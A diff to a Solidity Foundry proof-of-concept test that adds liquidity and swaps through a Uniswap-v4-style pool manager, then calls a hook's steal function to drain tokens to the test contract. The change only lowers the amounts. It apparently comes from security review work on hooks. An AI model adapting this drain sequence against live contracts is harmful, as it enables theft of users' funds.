@@ -43,19 +43,18 @@ contract POC is Test {
     function unlockCallback(bytes calldata d) external returns(bytes memory){
         Currency c0=Currency.wrap(address(token0)); Currency c1=Currency.wrap(address(token1));
         if(abi.decode(d,(uint256))==1){
-            (BalanceDelta delta,) = manager.modifyLiquidity(key, ModifyLiquidityParams(-60,60,10e18,0), "");
+            (BalanceDelta delta,) = manager.modifyLiquidity(key, ModifyLiquidityParams(-60,60,1e18,0), "");
             if(delta.amount0()<0){manager.sync(c0); token0.mint(address(manager), uint128(-delta.amount0())); manager.settle();}
             if(delta.amount1()<0){manager.sync(c1); token1.mint(address(manager), uint128(-delta.amount1())); manager.settle();}
             if(delta.amount0()>0) manager.take(c0, address(this), uint128(delta.amount0()));
             if(delta.amount1()>0) manager.take(c1, address(this), uint128(delta.amount1()));
         } else {
-            BalanceDelta s = manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
+            BalanceDelta s = manager.swap(key, SwapParams(false,-0.01e18,TickMath.MAX_SQRT_PRICE-1), "");
             if(s.amount0()<0){manager.sync(c0); token0.mint(address(manager), uint128(-s.amount0())); manager.settle();}
             else if(s.amount0()>0) manager.take(c0, address(this), uint128(s.amount0()));
             if(s.amount1()<0){manager.sync(c1); token1.mint(address(manager), uint128(-s.amount1())); manager.settle();}
             else if(s.amount1()>0) manager.take(c1, address(this), uint128(s.amount1()));
-            // take hook's 1e18
-            hook.steal(c0, address(this), 1e18);
+            hook.steal(c0, address(this), 0.1e18);
         }
         return "";
     }
